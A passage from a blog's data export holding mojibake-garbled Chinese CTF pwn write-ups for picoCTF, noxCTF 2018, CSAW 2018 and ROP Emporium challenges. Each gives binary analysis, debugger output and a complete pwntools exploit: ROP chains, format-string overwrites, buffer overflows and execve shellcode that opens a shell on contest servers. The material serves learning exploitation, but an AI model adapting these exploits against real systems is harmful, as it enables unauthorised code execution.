p += pack(&#39;&lt;I&#39;, 0x080549db) # mov dword ptr [edx], eax ; ret p += pack(&#39;&lt;I&#39;, 0x080481c9) # pop ebx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea060) # @ .data p += pack(&#39;&lt;I&#39;, 0x080de955) # pop ecx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8 p += pack(&#39;&lt;I&#39;, 0x0806f02a) # pop edx ; ret p += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8 p += pack(&#39;&lt;I&#39;, 0x08049303) # xor eax, eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0807a86f) # inc eax ; ret p += pack(&#39;&lt;I&#39;, 0x0806cc25) # int 0x80 n.recvuntil(&#39;NAME!&#39;) n.sendline(p) n.interactive() FLAG picoCTF{rOp_yOuR_wAY_tO_AnTHinG_cfdfc687}","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"nox_CSAWéƒ¨åˆ†pwné¢˜è§£","slug":"nox-CSAWéƒ¨åˆ†pwné¢˜è§£","date":"2019-11-05T03:46:18.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2019/11/05/nox-CSAWéƒ¨åˆ†pwné¢˜è§£/","link":"","permalink":"/2019/11/05/nox-CSAWéƒ¨åˆ†pwné¢˜è§£/","excerpt":"","text":"æš‘å‡çš„æ—¶å€™é‡åˆ°äº†ä¸€ç¾¤ä¸€èµ·å­¦ä¹ å®‰å…¨çš„å°ä¼™ä¼´ï¼Œåœ¨ä»–ä»¬çš„è¯±åŠä¸‹ï¼Œå¼€å§‹æ¥è§¦å›½å¤–çš„CTFæ¯”èµ›ï¼Œä½œä¸ºæœ€èœçš„pwné€‰æ‰‹å°±è¯•ç€å…ˆæ‰“ä¸¤åœºæ¯”èµ›è¯•è¯•æ°´ï¼Œç»“æœå‘ç°å›½å¤–æ¯”èµ›çœŸæœ‰æ„æ€å“å˜¿ã€‚ æœ¬æ–‡é¦–å‘äºå®‰æ’ç½‘ç»œç©ºé—´å®‰å…¨è®²æ­¦å ‚ NOXCTFPWNâ€”believeMe(378)æƒ¯ä¾‹å…ˆèµ°ä¸€éfile+checksecæ£€æŸ¥ âœ believeMe file believeMe believeMe: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=03d2b6bcc0a0fdbab80a9852cab1d201437e7e30, not stripped âœ believeMe checksec believeMe [*] &#39;/home/Ep3ius/pwn/process/noxCTF2018/believeMe/believeMe&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) å†ç®€å•çš„è¿è¡Œä¸‹ç¨‹åºçœ‹çœ‹ç¨‹åºæ˜¯ä»€ä¹ˆæ ·çš„ç»“æ„ âœ believeMe ./believeMe Someone told me that pwning makes noxÄle... But......... how ???? aaaa aaaa% âœ believeMe ç„¶åidaç®€å•åˆ†æä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆç›´æ¥çš„çœ‹åˆ°åœ¨mainå‡½æ•°é‡Œæœ‰ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ .text:080487CC ; 10: printf(s); .text:080487CC sub esp, 0Ch .text:080487CF lea eax, [ebp+s] .text:080487D2 push eax ; format .text:080487D3 call _printf è¿™é‡Œæˆ‘æœ¬æ¥ä»¥ä¸ºåªæ˜¯ç®€å•çš„åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²å»ä¿®æ”¹fflush_gotæ‰€ä»¥æˆ‘å…ˆæµ‹å‡ºæ¥fmtçš„åç§»é‡ä¸º9 âœ believeMe ./believeMe Someone told me that pwning makes noxÄle... But......... how ???? aaaa%9$x aaaa61616161% âœ believeMe ç„¶åæ„é€ payload=fmtstr_payload(9,{fflush_got:noxflag_addr})æƒ³ç›´æ¥getflagï¼Œç„¶åå®é™…ä¸Šæ²¡é‚£ä¹ˆç®€å•ã€‚è°ƒè¯•è¿‡åå‘ç°fmtstr_payloadä¸å…¨ï¼Œlen(payload)è¾“å‡ºæ£€æŸ¥åå‘ç°é•¿åº¦è¶…äº†ï¼Œç¨å¾®æŸ¥äº†ä¸‹pwntoolsæ–‡æ¡£çš„fmtstréƒ¨åˆ†ï¼Œå‘ç°å®ƒé»˜è®¤æ˜¯ä»¥hhnä¹Ÿå°±æ˜¯å•å­—èŠ‚çš„å½¢å¼å»æ„é€ payloadï¼Œå¦‚æœä»¥åŒå­—èŠ‚æˆ–å››å­—èŠ‚çš„å½¢å¼è¦åŠ ä¸Šwrite_sizeå‚æ•°ï¼Œè¿™æ ·payloadçš„é•¿åº¦å°±ä¸ä¼šè¶…è¿‡40 payload = fmtstr_payload(9,{fflush_got:noxFlag_addr},write_size=&#39;short&#39;) ç„¶è€Œå½“æˆ‘ä»¬æˆåŠŸä¿®æ”¹fflush_gotä¸ºnoxFlagçš„åœ°å€æ—¶ä¼šè¿›å…¥åˆ°ä¸€ä¸ªæ­»å¾ªç¯ä¸­ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹noxFlagå‡½æ•°é‡Œé¢ä¸éš¾å‘ç°é—®é¢˜ void __noreturn noxFlag() { char i; // [esp+Bh] [ebp-Dh] FILE *stream; // [esp+Ch] [ebp-Ch] stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;); puts(s); fflush(stdout);//è¿™é‡Œåˆè°ƒç”¨äº†fflushå‡½æ•°ï¼Œç”±äºæˆ‘ä»¬æŠŠfflush_gotæ”¹æˆäº†noxFlagåœ°å€ï¼Œè¿™é‡Œç›¸å½“é€’å½’è°ƒç”¨noxFlagï¼Œå½¢æˆæ­»å¾ªç¯ if ( stream ) { for ( i = fgetc(stream); i != -1; i = fgetc(stream) ) { putchar(i); fflush(stdout); } fflush(stdout); fclose(stream); } else { puts(&quot;Can&#39;t read file \\n&quot;); fflush(stdout); } exit(0); } å½“æ—¶å°±å¡åœ¨è¿™é‡Œæ²¡ç»•å‡ºå»ï¼Œç»è¿‡é˜Ÿå‹æé†’èƒ½ä¸èƒ½æ”¹returnåœ°å€ï¼Œæ‰å‘ç°æ€è·¯èµ°åäº† æˆ‘ä»¬gdbæŠŠæ–­ç‚¹ä¸‹åœ¨printfè°ƒè¯•ä¸€ä¸‹ï¼Œå…ˆæŸ¥çœ‹ä¸‹å †æ ˆ gdb-peda$ stack 30 0000| 0xffffcf1c --&gt; 0x80487d8 (&lt;main+129&gt;: add esp,0x10) 0004| 0xffffcf20 --&gt; 0xffffcf44 (&quot;aaaa%21$x&quot;) 0008| 0xffffcf24 --&gt; 0x804890c --&gt; 0xa (&#39;\\n&#39;) 0012| 0xffffcf28 --&gt; 0xf7fb45a0 --&gt; 0xfbad2288 0016| 0xffffcf2c --&gt; 0x8f17 0020| 0xffffcf30 --&gt; 0xffffffff 0024| 0xffffcf34 --&gt; 0x2f (&#39;/&#39;) 0028| 0xffffcf38 --&gt; 0xf7e0edc8 --&gt; 0x2b76 (&#39;v+&#39;) 0032| 0xffffcf3c --&gt; 0xffffd024 --&gt; 0xffffd201 (&quot;/home/Ep3ius/pwn/process/noxCTF2018/believeMe/believeMe&quot;) 0036| 0xffffcf40 --&gt; 0x8000 0040| 0xffffcf44 (&quot;aaaa%21$x&quot;) 0044| 0xffffcf48 (&quot;%21$x&quot;) 0048| 0xffffcf4c --&gt; 0xf7000078 0052| 0xffffcf50 --&gt; 0x1 0056| 0xffffcf54 --&gt; 0x0 0060| 0xffffcf58 --&gt; 0xf7e30a50 (&lt;__new_exitfn+16&gt;: add ebx,0x1835b0) 0064| 0xffffcf5c --&gt; 0x804885b (&lt;__libc_csu_init+75&gt;: add edi,0x1) 0068| 0xffffcf60 --&gt; 0x1 0072| 0xffffcf64 --&gt; 0xffffd024 --&gt; 0xffffd201 (&quot;/home/Ep3ius/pwn/process/noxCTF2018/believeMe/believeMe&quot;) 0076| 0xffffcf68 --&gt; 0xffffd02c --&gt; 0xffffd239 (&quot;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat0&quot;) 0080| 0xffffcf6c --&gt; 0xed1acd00 0084| 0xffffcf70 --&gt; 0xf7fb43dc --&gt; 0xf7fb51e0 --&gt; 0x0 0088| 0xffffcf74 --&gt; 0xffffcf90 --&gt; 0x1 0092| 0xffffcf78 --&gt; 0x0 0096| 0xffffcf7c --&gt; 0xf7e1a637 (&lt;__libc_start_main+247&gt;: add esp,0x10) --More--(25/30) 0100| 0xffffcf80 --&gt; 0xf7fb4000 --&gt; 0x1b1db0 0104| 0xffffcf84 --&gt; 0xf7fb4000 --&gt; 0x1b1db0 0108| 0xffffcf88 --&gt; 0x0 0112| 0xffffcf8c --&gt; 0xf7e1a637 (&lt;__libc_start_main+247&gt;: add esp,0x10) 0116| 0xffffcf90 --&gt; 0x1 æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨åç§»112å¤„returnåœ°å€ä¸º0xFFFFCF8Cï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸ªä¸å®ƒåç§»ç›¸è¿‘çš„å¹¶ä¸”èƒ½è¢«æ³„éœ²å‡ºæ¥çš„åœ°å€ï¼Œå› ä¸ºé¢˜ç›®è¯´äº†(No ASLR) ï¼Œæ‰€ä»¥returnçš„åœ°å€æ˜¯ä¸ä¼šå˜åŒ–ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆè¿ä¸Šä¸€æ¬¡å¾—åˆ°returnåœ°å€æ„é€ payloadæ¥getflag (è¿™é‡Œæœ‰ä¸€ä¸ªæŒºå‘çš„åœ°æ–¹å°±æ˜¯ä½ åœ¨æœ¬åœ°å¤ç°æ—¶ç»ˆç«¯è¿è¡Œå¾—åˆ°åœ°å€å’Œç”¨pwntoolså¾—åˆ°çš„åœ°å€å¯èƒ½ä¸ä¸€æ ·ï¼Œè¿™å—æˆ‘è¿˜æ˜¯ä¸æ‡‚æ˜¯ä»€ä¹ˆåŸç†ï¼Œå¸Œæœ›çŸ¥é“çš„å¸ˆå‚…èƒ½è®²ä¸€ä¸‹å­¦ä¹ ä¸€æ³¢) EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;)#,log_level=&#39;debug&#39;) #n = process(&#39;./believeMe&#39;) n = remote(&#39;18.223.228.52&#39;,13337) shell_addr = 0x804867b #ret_addr = 0xffffd030 - 0x4 ret_addr = 0xffffdd30 - 0x4 payload = fmtstr_payload(9,{ret_addr:shell_addr},write_size=&#39;short&#39;) n.recvuntil(&#39;But......... how ????&#39;) #n.sendline(&#39;%21$x&#39;) n.sendline(payload) n.interactive() FLAG noxCTF{N3ver_7rust_4h3_F0rmat} PWNâ€”The Name Calculatoræƒ¯ä¾‹æ£€æŸ¥ä¸€éæ–‡ä»¶ âœ TheNameCalculator file TheNameCalculator TheNameCalculator: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=8f717904e2313e4d6c3bc92730d2e475861123dd, not stripped âœ TheNameCalculator checksec TheNameCalculator [*] &#39;/home/Ep3ius/pwn/process/noxCTF2018/TheNameCalculator/TheNameCalculator&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) ç®€å•è¿‡ä¸€éç¨‹åºï¼Œåªæœ‰ä¸€ä¸ªè¾“å…¥ âœ TheNameCalculator ./TheNameCalculator What is your name? Ep3ius Iâ€˜ve heard better å¼€idaå‘ç°åœ¨mainé‡Œæœ‰ä¸ªå¥—è·¯checkï¼Œv4åœ¨read_bufåä¸å†ä¿®æ”¹ï¼Œå¹¶ä¸”bufçš„è¾“å…¥å¤§å°å¯ä»¥æ­£å¥½è¦†ç›–v4çš„å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬æ„é€ payload = &#39;a&#39;* (0x2c-0x10)+p32(0x6A4B825)è®©v4åœ¨ifåˆ¤æ–­æ—¶çš„å€¼ä¸º0x6A4B825 puts(&quot;What is your name?&quot;); fflush(stdout); read(0, &amp;buf, 0x20u); fflush(stdin); if ( v4 == 0x6A4B825 ) { secretFunc(); } è¿›å…¥secretFuncå‡½æ•°åå‘ç°å‡½æ•°æœ€æœ«å°¾æœ‰ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡æ”¹exit_gotæ¥å®ç°è·³è½¬ï¼Œä½†ä¸­é—´æœ‰ä¸€æ®µå¯¹è¾“å…¥è¿›è¡Œä¸€ä¸ªå¼‚æˆ–åŠ å¯†ï¼ŒåŠ å¯†æ–¹å¼å¾ˆç®€å•å°±ä¸å†èµ˜è¿°ï¼Œæœ€ç»ˆè¦è¾¾åˆ°çš„å°±æ˜¯è¾“å…¥â€™aaaa%12$xâ€™èƒ½è¿”å›æœªåŠ å¯†æ—¶æ ¼å¼åŒ–å­—ç¬¦ä¸²æ­£ç¡®çš„å‚æ•°å°±ç®—æˆåŠŸäº†ï¼Œå‰©ä¸‹çš„å°±æ˜¯æ™®é€šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ”¹gotçš„æ ‡å‡†å¥—è·¯äº†ï¼Œä¸è¿‡è¾“å…¥çš„fmt_payloadçš„å¤§å°é™åˆ¶åœ¨äº†27è€Œå¦‚æœæˆ‘ä»¬ç›´æ¥ç”¨fmtstr_payloadç”Ÿæˆçš„payloadçš„é•¿åº¦æ˜¯è¶…è¿‡è¿™ä¸ªå¤§å°çš„ï¼Œæ°å·§çš„æ˜¯exit_gotå’ŒsuperSecretFuncçš„å‰ä¸¤ä½ç›¸åŒéƒ½ä¸º0x0804ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„payloadå°±ä¸éœ€è¦å†æ”¹exit_gotçš„å‰ä¸¤ä½ä½¿æˆ‘ä»¬payloadçš„é•¿åº¦ç¼©å‡è‡³21 for ( i = buf; i &lt; (int *)((char *)&amp;buf[-1] + v3); i = (int *)((char *)i + 1) ) *i ^= 0x5F7B4153u; encrypt def encrypt(enc): buf = list(enc) for i in range(0, len(buf) - 4): payload = &#39;&#39;.join(buf[i:i+4]) key = u32(payload)^0x5F7B4153 buf[i:i+4] = list(p32(key)) return &#39;&#39;.join(buf) EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;)#,log_level=&#39;debug&#39;) n = process(&#39;./TheNameCalculator&#39;) #n = remote(&#39;chal.noxale.com&#39;, 5678) elf = ELF(&#39;./TheNameCalculator&#39;) exit_got = elf.got[&#39;exit&#39;] superSecretFunc_addr = 0x08048596 name = &#39;a&#39;*(0x2c-0x10)+p32(0x6A4B825) def encrypt(enc): buf = list(enc) for i in range(0, len(buf) - 4): payload = &#39;&#39;.join(buf[i:i+4]) key = u32(payload)^0x5F7B4153 buf[i:i+4] = list(p32(key)) return &#39;&#39;.join(buf) def check_name(): n.recvuntil(&#39;name?\\n&#39;) n.send(name) def secretFunc(payload): n.recvuntil(&#39;please&#39;) n.send(encrypt(payload)) check_name() payload = fmtstr_payload(12,{exit_got:superSecretFunc_addr},write_size=&#39;short&#39;)[0:21] offset = &#39;aaaa%12$x&#39; secretFunc(payload) n.interactive() FLAG noxCTF{M1nd_7he_Input} CSAW CTFPWNâ€”bigboyç®€å•çš„bofç±»å‹é¢˜ç›®ï¼Œå…ˆæ£€æŸ¥æ–‡ä»¶ âœ bigboy file boi boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped âœ bigboy checksec boi [*] &#39;/home/Ep3ius/pwn/process/CSAW2018/bigboy/boi&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) idaF5çœ‹ä¸€ä¸‹ç¨‹åºé€»è¾‘ int __cdecl main(int argc, const char **argv, const char **envp) { __int64 buf; // [rsp+10h] [rbp-30h] __int64 v5; // [rsp+18h] [rbp-28h] __int64 v6; // [rsp+20h] [rbp-20h] int v7; // [rsp+28h] [rbp-18h] unsigned __int64 v8; // [rsp+38h] [rbp-8h] v8 = __readfsqword(0x28u); buf = 0LL; v5 = 0LL; v6 = 0LL; v7 = 0; HIDWORD(v6) = 0xDEADBEEF; puts(&quot;Are you a big boiiiii??&quot;); read(0, &amp;buf, 24uLL); if ( HIDWORD(v6) == 0xCAF3BAEE ) run_cmd(&quot;/bin/bash&quot;); else run_cmd(&quot;/bin/date&quot;); return 0; } æœ¬ä»¥ä¸ºæ„é€ payload = â€˜aâ€™* (0x30-0x20)+p32(0xCAF3BAEE)å°±å¯ä»¥ç›´æ¥è¿‡ifåˆ¤æ–­getshellï¼Œç„¶è€Œäº‹æƒ…å¹¶æ²¡é‚£ä¹ˆç®€å•ï¼Œgdbè°ƒè¯•ä¸€ä¸‹å‘ç°0xCAF3BAEEè·ç¦»æˆ‘ä»¬æƒ³è¦å‡ºç°åœ¨çš„ä½ç½®å·®äº†4 [-------------------------------------code-------------------------------------] 0x40069b &lt;main+90&gt;: mov edi,0x0 0x4006a0 &lt;main+95&gt;: call 0x400500 &lt;read@plt&gt; 0x4006a5 &lt;main+100&gt;: mov eax,DWORD PTR [rbp-0x1c] =&gt; 0x4006a8 &lt;main+103&gt;: cmp eax,0xcaf3baee 0x4006ad &lt;main+108&gt;: jne 0x4006bb &lt;main+122&gt; 0x4006af &lt;main+110&gt;: mov edi,0x40077c 0x4006b4 &lt;main+115&gt;: call 0x400626 &lt;run_cmd&gt; 0x4006b9 &lt;main+120&gt;: jmp 0x4006c5 &lt;main+132&gt; [------------------------------------stack-------------------------------------] 0000| 0x7ffd1313f360 --&gt; 0x7ffd1313f488 --&gt; 0x7ffd131402a8 --&gt; 0x545100696f622f2e (&#39;./boi&#39;) 0008| 0x7ffd1313f368 --&gt; 0x10040072d 0016| 0x7ffd1313f370 (&#39;a&#39; &lt;repeats 16 times&gt;, &quot;\\356\\272\\363\\312\\n\\276\\255&quot;, &lt;incomplete sequence \\336&gt;) 0024| 0x7ffd1313f378 (&quot;aaaaaaaa\\356\\272\\363\\312\\n\\276\\255&quot;, &lt;incomplete sequence \\336&gt;) 0032| 0x7ffd1313f380 --&gt; 0xdeadbe0acaf3baee 0040| 0x7ffd1313f388 --&gt; 0x0 0048| 0x7ffd1313f390 --&gt; 0x7ffd1313f480 --&gt; 0x1 0056| 0x7ffd1313f398 --&gt; 0xcc79c30a8da0b800 [------------------------------------------------------------------------------] blue Legend: code, data, rodata, value 0x00000000004006a8 in main () gdb-peda$ p $eax $1 = 0xdeadbe0a idaF5çœ‹ä¸å‡ºä»€ä¹ˆä¸œè¥¿ï¼Œç›´æ¥åˆ‡æ±‡ç¼– mov dword ptr [rbp+v6+4], 0DEADBEEFh mov edi, offset s ; &quot;Are you a big boiiiii??&quot; call _puts lea rax, [rbp+buf] mov edx, 18h ; nbytes mov rsi, rax ; buf mov edi, 0 ; fd call _read mov eax, dword ptr [rbp+v6+4] cmp eax, 0CAF3BAEEh jnz short loc_4006BB è¿™é‡Œæˆ‘ä»¬å¯ä»¥å¾ˆç®€å•å°±çœ‹å‡ºåŸå› æ‰€åœ¨ï¼Œeaxæ‰€å­˜çš„æŒ‡é’ˆæŒ‡å‘çš„æ˜¯rbp-0x20+4è€Œbufçš„é¦–åœ°å€æ˜¯æŒ‡å‘rbp-0x30,è€Œifè¯­å¥æ¯”è¾ƒçš„ç›¸å½“äºåœ¨0x4006A8æ—¶çš„eaxå¯„å­˜å™¨çš„å€¼ä¸0xCAF3BAEEæ˜¯å¦ç›¸ç­‰ï¼Œè€Œä¸¤è€…çš„å·®å€¼å¹¶éæ˜¯v6ä¸bufåœ¨æ ˆä¸Šçš„è·ç¦»ï¼Œè€Œå®é™…çš„è·ç¦»åº”è¯¥æ˜¯0x30-0x20+4 EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) #n = process(&#39;./boi&#39;) n = remote(&#39;pwn.chal.csaw.io&#39;,9000) payload = &#39;a&#39;*(0x30-0x20+0x4)+p32(0xCAF3BAEE) n.recvuntil(&#39;??&#39;) #gdb.attach(n) n.sendline(payload) n.interactive() FLAG flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis} PWNâ€”get itâœ get_it file get_it get_it: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=87529a0af36e617a1cc6b9f53001fdb88a9262a2, not stripped âœ get_it checksec get_it [*] &#39;/home/Ep3ius/pwn/process/CSAW2018/get_it/get_it&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) ç¨‹åºçš„é€»è¾‘å¾ˆç®€å•ï¼Œä¸€ä¸ªgetsæº¢å‡ºï¼Œä¹Ÿç»™äº†system(â€˜/bin/shâ€™)å‡½æ•°ï¼Œè™½ç„¶å¼€äº†NXéº»çƒ¦ç›´æ¥shellcodeæ¥getshellï¼Œä½†ret2textè¿˜æ˜¯å¾ˆç®€å•çš„å°±ç›´æ¥ç»™expäº† EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) #n = process(&#39;./get_it&#39;) n = remote(&#39;pwn.chal.csaw.io&#39;,9001) give_shell = 0x04005b6 buf = &#39;a&#39;*(32+8) payload = buf + p64(give_shell) n.recvuntil(&#39;it??&#39;) n.sendline(payload) n.interactive() FLAG flag{y0u_deF_get_itls} PWNâ€”shell-&gt;codeâœ shellpointcode file shellpointcode shellpointcode: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=214cfc4f959e86fe8500f593e60ff2a33b3057ee, not stripped âœ shellpointcode checksec shellpointcode [*] &#39;/home/Ep3ius/pwn/process/CSAW2018/shellpointcode/shellpointcode&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments å¾ˆæ˜æ˜¾çš„è®©ä½ å†™shellcodeçš„é¢˜ç›®ï¼Œç®€å•çš„å®¡è®¡å’Œè¿è¡Œè¿‡ä¸€éç¨‹åºåå‘ç°ä»–æ˜¯ä¸€ä¸ªæœ‰ä¸¤ä¸ªèŠ‚ç‚¹é“¾è¡¨ç»“æ„ï¼Œå¹¶ä¸”æ¯ä¸ªèŠ‚ç‚¹è¾“å…¥æœ€å¤šä¸º15byteï¼Œå¹¶ä¸”åœ¨node.nextæ³„éœ²å‡ºäº†æ ˆä¸Šçš„åœ°å€ï¼Œå¯¹äºå®Œæ•´shellcodeæ¥è¯´15å­—èŠ‚ä¸€èˆ¬æ˜¯ä¸å¤Ÿçš„ âœ shellpointcode ./shellpointcode Linked lists are great! They let you chain pieces of data together. (15 bytes) Text for node 1: aaaa (15 bytes) Text for node 2: bbbb node1: node.next: 0x7ffd53539c70 node.buffer: aaaa What are your initials? 111 Thanks 111 ç®€å•åˆ†æè°ƒè¯•åå¯ä»¥å¾—åˆ°æ ˆæº¢å‡ºå8byteåå³ä¸ºè¿”å›åœ°å€ï¼Œæˆ‘ä»¬åœ¨å†™å®Œretåœ°å€åæ¥ç€å†™å…¥â€˜/bin/shâ€™å¯ä»¥è¾¾åˆ°åœ¨å¼€å§‹æ‰§è¡Œshellcodeæ—¶rspé‡Œå­˜æ”¾çš„æ˜¯æŒ‡å‘/bin/shçš„æŒ‡é’ˆï¼Œé‚£ä¹ˆä¾¿å¯ä»¥åˆ©ç”¨mov rdi,rspä½¿â€˜/bin/sh\\0â€™ä½œä¸ºexecveçš„å‚æ•°æ¥è°ƒç”¨execve(â€˜/bin/shâ€™)æ¥getshell [----------------------------------registers-----------------------------------] RAX: 0x19 RBX: 0x0 RCX: 0x7f1f405832c0 (&lt;__write_nocancel+7&gt;: cmp rax,0xfffffffffffff001) RDX: 0x7f1f40852780 --&gt; 0x0 RSI: 0x7ffea8fdff90 (&quot;Thanks &quot;, &#39;a&#39; &lt;repeats 11 times&gt;, &quot;h&amp;\\376\\250\\376\\177\\n\\nnode.buffer: H\\211\\347j;X1\\366\\231\\017\\005\\n\\n&quot;) RDI: 0x1 RBP: 0x6161616161616161 (&#39;aaaaaaaa&#39;) RSP: 0x7ffea8fe2638 --&gt; 0x7ffea8fe2668 --&gt; 0xf631583b6ae78948 RIP: 0x55d7207d08ee (ret) R8 : 0x7f1f40a5e700 (0x00007f1f40a5e700) R9 : 0x19 R10: 0x11 R11: 0x246 R12: 0x55d7207d0720 (xor ebp,ebp) R13: 0x7ffea8fe2770 --&gt; 0x1 R14: 0x0 R15: 0x0 EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x55d7207d08e7: call 0x55d7207d06d0 0x55d7207d08ec: nop 0x55d7207d08ed: leave =&gt; 0x55d7207d08ee: ret 0x55d7207d08ef: push rbp 0x55d7207d08f0: mov rbp,rsp 0x55d7207d08f3: sub rsp,0x40 0x55d7207d08f7: lea rax,[rbp-0x40] [------------------------------------stack-------------------------------------] 0000| 0x7ffea8fe2638 --&gt; 0x7ffea8fe2668 --&gt; 0xf631583b6ae78948 0008| 0x7ffea8fe2640 --&gt; 0x68732f6e69622f (&#39;/bin/sh&#39;) 0016| 0x7ffea8fe2648 --&gt; 0xa (&#39;\\n&#39;) 0024| 0x7ffea8fe2650 --&gt; 0x0 0032| 0x7ffea8fe2658 --&gt; 0x7f1f40851620 --&gt; 0xfbad2887 0040| 0x7ffea8fe2660 --&gt; 0x7ffea8fe2640 --&gt; 0x68732f6e69622f (&#39;/bin/sh&#39;) 0048| 0x7ffea8fe2668 --&gt; 0xf631583b6ae78948 0056| 0x7ffea8fe2670 --&gt; 0xa050f99 [------------------------------------------------------------------------------] blue Legend: code, data, rodata, value 0x000055d7207d08ee in ?? () execveçš„æ±‡ç¼–å¯ä»¥å‚è€ƒhttp://spd.dropsec.xyz/2017/02/20/%E4%BB%8E%E6%B1%87%E7%BC%96%E8%A7%92%E5%BA%A6%E5%88%86%E6%9E%90execve%E5%87%BD%E6%95%B0/ EXP from pwn import* context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) n = process(&#39;./shellpointcode&#39;) #n = remote(&#39;pwn.chal.csaw.io&#39;,9005) shellcode =&quot;&quot;&quot; mov rdi, rsp /* call execve(&#39;rsp&#39;,0,0) rsp-&gt;&#39;/bin/sh\\0&#39; */ push 0x3b /* sys_execve */ pop rax xor esi,esi syscall &quot;&quot;&quot; #print len(asm(shellcode)) #raw_input() n.sendline(asm(shellcode)) sleep(0.1) n.sendline(&#39;&#39;) n.recvuntil(&quot;node.next: &quot;) stack = int(n.recvuntil(&#39;\\n&#39;),16) #gdb.attach(n) node_2 = stack + 0x28 n.sendline(&#39;a&#39;*11 + p64(node_2) + &#39;/bin/sh\\0&#39;) n.interactive() FLAG flag{NONONODE_YOU_WRECKED_BRO}","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"ROP_Emporium","slug":"ROP-Emporium","date":"2019-11-05T03:45:15.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2019/11/05/ROP-Emporium/","link":"","permalink":"/2019/11/05/ROP-Emporium/","excerpt":"","text":"æš‘å‡å»äº†è¶ŸXmanè®¤è¯†äº†ä¸€ç¾¤å¤§ä½¬ï¼Œä¹Ÿå› æ­¤å—åˆ°åˆºæ¿€æˆé•¿äº†ä¸å°‘ï¼Œè¿™é‡Œå°±å†™ä¸€ç¯‡åœ¨xmanæ—¶é€šå…³çš„ROPâ€”Emporiumçš„wpæ¥è®°å½•ä¸€ä¸‹è‡ªå·±çš„å­¦ä¹ å†ç¨‹ ret2win32æ€è·¯ç®€å•çš„ropæ„é€ ï¼Œctf-wikiä¸Šå¥½åƒæŠŠè¿™ç§å«åšret2text expfrom pwn import* context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;) n = process(&#39;ret2win32&#39;) elf = ELF(&#39;ret2win32&#39;) bufsize = 40 buf = &#39;a&#39;*bufsize sh_addr = 0x08048659 payload = buf + &#39;aaaa&#39; + p32(sh_addr) def pwn(): n.recvuntil(&#39;&gt;&#39;) n.sendline(payload) pwn() n.interactive() 